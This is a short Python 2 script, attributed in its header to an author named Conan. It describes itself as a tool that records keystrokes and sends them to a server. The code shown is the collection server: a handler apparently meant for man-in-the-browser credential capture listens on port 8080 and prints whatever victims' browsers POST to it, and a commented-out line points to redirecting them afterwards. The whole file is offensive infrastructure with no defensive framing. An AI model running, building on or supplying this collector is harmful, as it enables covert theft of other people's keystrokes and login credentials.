# -*- coding=utf-8 -*-
# Author: Conan
# Email:1526840124@qq.com
# Description: A tool to record keyboard and send the record to server
import SimpleHTTPServer
import SocketServer
import urllib


class MitBCredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        info = self.rfile.read(content_length).decode('utf-8')
        print info
        self.send_response(200)
        # self.send_header('Location', urllib.unquote(site))
        self.end_headers()


server = SocketServer.TCPServer(('0.0.0.0', 8080), MitBCredRequestHandler)
server.serve_forever()
